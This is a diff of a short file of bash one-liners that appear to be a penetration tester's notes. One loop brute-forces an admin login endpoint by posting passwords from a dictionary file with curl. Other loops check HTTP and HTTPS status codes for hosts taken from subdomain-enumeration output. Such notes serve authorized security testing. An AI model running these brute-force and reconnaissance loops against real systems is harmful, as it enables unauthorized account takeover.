@@ -1,4 +1,5 @@
-while read -r line;do q=$(curl -skL -H "Content-Type: application/json" -X POST http://IP.IP.IP.IP:5000/admin/login -d '{"login":"admin", "password":"$line"}');echo "resp:$q,pass:$line"; done < ../dictionary/s_pass_admin.txt > wynik.txt
+$while read -r line;do q=$(curl -skL -H "Content-Type: application/json" -X POST http://IP.IP.IP.IP:5000/admin/login -d '{"login":"admin", "password":"$line"}');echo "resp:$q,pass:$line"; done < ../dictionary/s_pass_admin.txt > wynik.txt
 
+$ while read -r line; do printf "$line http_code:";curl -s -o /dev/null -w "%{http_code}%" -k -L -m 7 http://$line;echo;done < plik_in > plik_out
 
-while read -r line; do printf "$line http_code:";curl -s -o /dev/null -w "%{http_code}%" -k -L -m 7 http://$line;echo;done < plik_in > plik_out
+$ while read -r line;do printf "$line ";http=$(curl -s -o /dev/null -w "%{http_code}" -k -L -m 7 http://$line);https=$(curl -s -o /dev/null -w "%{http_code}" -k -L -m 7 https://$line);if [[ $http != "000" ]]; then printf "http:$http "; else printf "http:--- "; fi; if [[ $https != "000" ]]; then printf "https:$https"; else printf "https:---";fi;echo; done < amass_result_fqdn.txt 
